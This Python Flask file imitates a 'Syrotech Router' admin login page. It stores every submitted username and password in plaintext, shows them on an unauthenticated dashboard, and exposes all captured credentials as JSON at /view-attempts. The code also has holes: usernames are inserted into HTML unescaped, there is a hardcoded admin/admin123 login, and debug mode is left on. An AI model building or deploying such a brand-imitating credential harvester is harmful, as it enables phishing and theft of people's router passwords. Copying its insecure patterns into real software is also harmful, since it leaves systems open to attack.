from flask import Flask, render_template, request, redirect, url_for, flash, jsonify
from database import db_manager
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-here')

# Initialize database
@app.before_first_request
def initialize_database():
    """Initialize database and create tables"""
    db_manager.create_database_and_table()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', 'user')  # Default to 'user'
    password = request.form.get('password', '')
    remember = request.form.get('remember')
    
    # Get client information
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR'))
    user_agent = request.headers.get('User-Agent', '')
    
    # Save login attempt to database (always save, regardless of validity)
    success = False
    if username and password:
        # Save the login attempt
        db_manager.save_login_attempt(
            username=username,
            password=password,
            ip_address=ip_address,
            user_agent=user_agent,
            success=success
        )
    
    # Demo authentication (you can modify this logic)
    if username == 'admin' and password == 'admin123':
        success = True
        # Update the record to mark as successful
        db_manager.save_login_attempt(
            username=username,
            password=password,
            ip_address=ip_address,
            user_agent=user_agent,
            success=True
        )
        flash('Login successful!', 'success')
        return redirect(url_for('dashboard'))
    else:
        flash('Invalid credentials', 'error')
        return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    # Get recent login attempts for display
    recent_attempts = db_manager.get_all_login_attempts()[:10]  # Last 10 attempts
    
    # Build table rows
    table_rows = ""
    for attempt in recent_attempts:
        status_class = "success" if attempt["success"] else "failed"
        status_text = "Success" if attempt["success"] else "Failed"
        password_masked = "*" * len(attempt["password"])
        ip_addr = attempt["ip_address"] or "Unknown"
        
        table_rows += f'''<tr>
            <td>{attempt["timestamp"]}</td>
            <td>{attempt["username"]}</td>
            <td>{password_masked}</td>
            <td>{ip_addr}</td>
            <td class="{status_class}">{status_text}</td>
        </tr>'''
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Syrotech Router - Dashboard</title>
        <style>
            body {{ font-family: Inter, sans-serif; padding: 40px; background: #f7fafc; }}
            .container {{ max-width: 1000px; margin: 0 auto; background: white; padding: 40px; border-radius: 12px; }}
            .header {{ text-align: center; margin-bottom: 40px; }}
            .status {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 40px; }}
            .status-card {{ background: #667eea; color: white; padding: 20px; border-radius: 8px; text-align: center; }}
            .attempts-table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
            .attempts-table th, .attempts-table td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
            .attempts-table th {{ background-color: #f2f2f2; }}
            .success {{ color: green; }}
            .failed {{ color: red; }}
            .logout {{ margin-top: 20px; text-align: center; }}
            .logout a {{ color: #667eea; text-decoration: none; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Syrotech Router Dashboard</h1>
                <p>Welcome to the router administration panel</p>
            </div>
            <div class="status">
                <div class="status-card">
                    <h3>Status</h3>
                    <p>Online</p>
                </div>
                <div class="status-card">
                    <h3>Total Attempts</h3>
                    <p>{len(recent_attempts)}</p>
                </div>
                <div class="status-card">
                    <h3>WiFi Status</h3>
                    <p>Active</p>
                </div>
                <div class="status-card">
                    <h3>Uptime</h3>
                    <p>2d 14h 32m</p>
                </div>
            </div>
            
            <h2>Recent Login Attempts</h2>
            <table class="attempts-table">
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>IP Address</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody>
                    {table_rows}
                </tbody>
            </table>
            
            <div class="logout">
                <a href="/">← Back to Login</a> | 
                <a href="/view-attempts">View All Attempts</a>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/view-attempts')
def view_attempts():
    """View all login attempts in JSON format"""
    attempts = db_manager.get_all_login_attempts()
    return jsonify(attempts)

@app.teardown_appcontext
def close_db(error):
    """Close database connection when app context ends"""
    db_manager.close_connection()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)